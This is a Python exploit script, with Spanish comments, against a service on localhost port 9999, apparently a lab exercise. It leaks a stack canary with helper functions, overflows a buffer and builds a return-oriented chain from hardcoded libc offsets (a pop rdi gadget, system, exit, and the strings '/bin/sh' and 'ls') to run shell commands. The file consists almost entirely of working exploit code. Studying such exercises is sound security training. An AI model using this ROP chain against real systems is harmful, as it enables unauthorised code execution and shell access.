#!/usr/bin/env python3
import struct
import socket
from srv_canary import *
HOST = "127.0.0.1"
PORT = 9999
TIMEOUT = 1.5

# offset de system() en la libc (objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system)
system_offset = 0x53110

# offset de exit() en la libc (objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep exit)
exit_offset = 0x42340

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
pop_rdi_offset = 0x2a145

# offset de "/bin/sh" en la libc -> addr "/bin/sh" - (addr system - system_offset)
# strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh" ->  1a7ea4 /bin/sh
binsh_offset = 0x1a7ea4

# offset de "ls" en la libc -> addr "ls" - (addr system - system_offset)
# strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep $'ls\00' ->  877a 5lls
ls_offset = 0x877a

'''
[buffer overflow][canary][RBP padding]
[pop_rdi_ret]       ; gadget address
[/bin/sh or ls address]   ; argument for system()
[system() address]  ; function to call
[pop_rdi_ret]       ; same gadget again
[0x0]               ; exit code
[exit() address]    ; function to call
'''
def create_payload(libc_base, canary, padding, canary_padding, cmd_offset):	
	payload  = b"A" * padding
	payload += canary  # Direcci√≥n del canario
	payload += b"A" * canary_padding # Saltea las siguiente direccion correspondiente al RBP
	
	# ROP chain:

	# 1. system("/bin/sh")
	payload += struct.pack("<Q", libc_base + pop_rdi_offset)  # pop rdi; ret
	payload += struct.pack("<Q", libc_base + cmd_offset)    # arg1 = argument for system()
	payload += struct.pack("<Q", libc_base + system_offset)  # call system()

	# 2. exit(0)
	payload += struct.pack("<Q", libc_base + pop_rdi_offset)  # pop rdi; ret
	payload += struct.pack("<Q", 0x0)   # arg1 = 0 (exit code)
	payload += struct.pack("<Q", libc_base + exit_offset)    # call exit()

	return payload
	
   
def exploit_srv(libc_base, canary, padding):
	canary_padding=8 # RSP addrs
	payload = create_payload(libc_base, canary, padding, canary_padding, ls_offset);
	print(f"[*] Enviando payload con: libc {hex(libc_base)} y canario {hex(int.from_bytes(canary, "little"))}:")
	test_payload(payload)
	

			
if __name__ == "__main__":
	buffer_size = 64
	canary = find_canary(buffer_size, 8)
	offset = find_offset(buffer_size)
	libc = 0x00007ffff7dab000
	exploit_srv(libc, canary, offset)
